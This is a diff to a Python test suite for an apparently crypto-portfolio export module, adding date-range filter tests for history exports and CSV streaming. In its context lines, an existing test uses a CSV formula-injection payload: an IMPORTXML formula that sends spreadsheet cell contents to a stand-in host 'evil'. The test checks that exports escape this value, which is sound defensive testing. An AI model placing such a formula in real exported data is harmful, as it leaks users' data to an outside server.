@@ -581,7 +581,7 @@ async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSess
 
 async def test_csv_history_formula_injection_neutralized(db_session: AsyncSession) -> None:
     """Malicious token names starting with '+' are escaped in the history CSV."""
-    from audr.operations.exports import render_history_csv
+    from audr.operations.exports import render_history_csv  # noqa: PLC0415
 
     malicious_name = "+IMPORTXML(CONCAT(\"http://evil/\",SUBSTITUTE(A1,\" \",\"%20\")),\"//\")"
     base = datetime(2026, 7, 1, 0, 0, 0, tzinfo=UTC)
@@ -624,3 +624,95 @@ async def test_csv_history_formula_injection_neutralized(db_session: AsyncSessio
     assert name_cell.startswith("'"), (
         f"asset_name should be prefixed with a single-quote; got {name_cell!r}"
     )
+
+
+# ---------------------------------------------------------------------------
+# Date-filter tests (AUD-276)
+# ---------------------------------------------------------------------------
+
+
+async def test_export_full_history_from_filter(db_session: AsyncSession) -> None:
+    """export_full_history(from_=T) excludes snapshots before T."""
+    base = datetime(2026, 8, 1, 0, 0, 0, tzinfo=UTC)
+
+    snap_early = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=1))
+    snap_after = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=1))
+
+    data = await export_full_history(db_session, from_=base)
+
+    snap_ids = [s["snapshot_id"] for s in data["snapshots"]]
+    assert str(snap_early) not in snap_ids, "snapshot before from_ must be excluded"
+    assert str(snap_after) in snap_ids, "snapshot after from_ must be included"
+
+
+async def test_export_full_history_to_filter(db_session: AsyncSession) -> None:
+    """export_full_history(to_=T) excludes snapshots after T."""
+    base = datetime(2026, 8, 2, 0, 0, 0, tzinfo=UTC)
+
+    snap_before = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=1))
+    snap_late = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=1))
+
+    data = await export_full_history(db_session, to_=base)
+
+    snap_ids = [s["snapshot_id"] for s in data["snapshots"]]
+    assert str(snap_before) in snap_ids, "snapshot before to_ must be included"
+    assert str(snap_late) not in snap_ids, "snapshot after to_ must be excluded"
+
+
+async def test_export_full_history_window_filter(db_session: AsyncSession) -> None:
+    """export_full_history(from_=T1, to_=T2) includes only the window [T1, T2]."""
+    base = datetime(2026, 8, 3, 12, 0, 0, tzinfo=UTC)
+
+    snap_too_early = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=2))
+    snap_in_window = await _insert_snapshot(db_session, snapshotted_at=base)
+    snap_too_late  = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=2))
+
+    data = await export_full_history(
+        db_session,
+        from_=base - timedelta(hours=1),
+        to_=base + timedelta(hours=1),
+    )
+
+    snap_ids = [s["snapshot_id"] for s in data["snapshots"]]
+    assert str(snap_too_early) not in snap_ids
+    assert str(snap_in_window) in snap_ids
+    assert str(snap_too_late) not in snap_ids
+
+
+async def test_stream_history_csv_from_filter(db_session: AsyncSession) -> None:
+    """stream_history_csv(from_=T) excludes valuation lines before T."""
+    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+
+    base = datetime(2026, 8, 4, 0, 0, 0, tzinfo=UTC)
+    wallet_id = await _insert_wallet(db_session, "0x" + "aa" * 20)
+    asset_id = await _insert_asset(db_session, token_address="0x" + "bb" * 20, symbol="FLT")
+
+    snap_early = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=2))
+    obs_early  = await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=asset_id)
+    await _insert_valuation_line(
+        db_session, snapshot_id=snap_early, wallet_id=wallet_id, asset_id=asset_id, observation_id=obs_early
+    )
+
+    snap_later = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=1))
+    obs_later  = await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=asset_id)
+    await _insert_valuation_line(
+        db_session, snapshot_id=snap_later, wallet_id=wallet_id, asset_id=asset_id, observation_id=obs_later
+    )
+
+    csv_text = "".join([chunk async for chunk in stream_history_csv(db_session, from_=base)])
+
+    assert str(snap_early) not in csv_text, "rows for snapshot before from_ must not appear"
+    assert str(snap_later) in csv_text, "rows for snapshot after from_ must appear"
+
+
+async def test_stream_history_csv_is_generator(db_session: AsyncSession) -> None:
+    """stream_history_csv must return an async generator (not a string or coroutine)."""
+    from collections.abc import AsyncGenerator  # noqa: PLC0415
+
+    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+
+    gen = stream_history_csv(db_session)
+    assert isinstance(gen, AsyncGenerator), "stream_history_csv must return an AsyncGenerator"
+    # consume to avoid ResourceWarning
+    async for _ in gen:
+        break
